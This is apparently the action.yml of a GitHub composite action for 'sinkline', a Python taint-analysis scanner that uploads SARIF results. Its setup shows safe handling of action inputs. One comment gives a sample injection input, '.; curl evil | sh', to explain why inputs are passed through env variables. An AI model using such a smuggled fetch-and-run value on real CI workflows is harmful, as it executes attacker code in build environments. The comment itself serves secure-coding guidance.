name: sinkline
description: Interprocedural taint analysis for Python web apps (OWASP Top 10), emitting SARIF for GitHub code scanning.
author: Sami Ali
branding:
  icon: git-branch
  color: red
inputs:
  path:
    description: File or directory to scan
    default: "."
  fail-on:
    description: Fail the job if a finding at/above this severity exists (low|medium|high|critical). Empty = never fail.
    default: ""
  min-confidence:
    description: low|medium|high
    default: "low"
runs:
  using: composite
  steps:
    # Inputs are passed through `env:` and used quoted inside the script. Never write
    # ${{ inputs.* }} inside a `run:` block: the expression is pasted into the shell text
    # before bash parses it, so an input like `.; curl evil | sh` becomes code.
    - shell: bash
      env:
        ACTION_PATH: ${{ github.action_path }}
      run: pip install "$ACTION_PATH"
    - shell: bash
      env:
        ACTION_PATH: ${{ github.action_path }}
        INPUT_PATH: ${{ inputs.path }}
        INPUT_FAIL_ON: ${{ inputs.fail-on }}
        INPUT_MIN_CONFIDENCE: ${{ inputs.min-confidence }}
      run: bash "$ACTION_PATH/scripts/action-scan.sh"
    - uses: github/codeql-action/upload-sarif@v3
      with:
        sarif_file: sinkline.sarif
        category: sinkline
    - shell: bash
      env:
        INPUT_FAIL_ON: ${{ inputs.fail-on }}
      run: |
        if [ "${SINKLINE_RC:-0}" = "1" ]; then
          echo "::error::sinkline found findings at/above $INPUT_FAIL_ON"; exit 1
        elif [ "${SINKLINE_RC:-0}" != "0" ]; then
          echo "::error::sinkline exited with status $SINKLINE_RC"; exit 1
        fi
